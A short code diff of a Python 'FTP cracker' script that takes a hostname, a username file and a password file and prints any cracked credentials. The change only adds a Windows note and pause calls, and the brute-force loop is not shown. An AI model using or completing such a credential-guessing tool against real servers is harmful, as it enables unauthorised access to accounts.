@@ -1,12 +1,15 @@
 from ftplib import FTP
 import os
+#The os commands will only work if you're using windows!
 print("FTP cracker")
 ip = input("Hostname: ")
 users = input("Userfile: ")
 passwords = input("Passfile: ")
 def cracked():
     print("Cracked FTP access, user: "+u[x]+" pass: "+p[y])
-    print()
+    os.system("pause")
+    os.system("pause")
+    os.system("pause")
 u = []
 p = []
 os.system("cls")
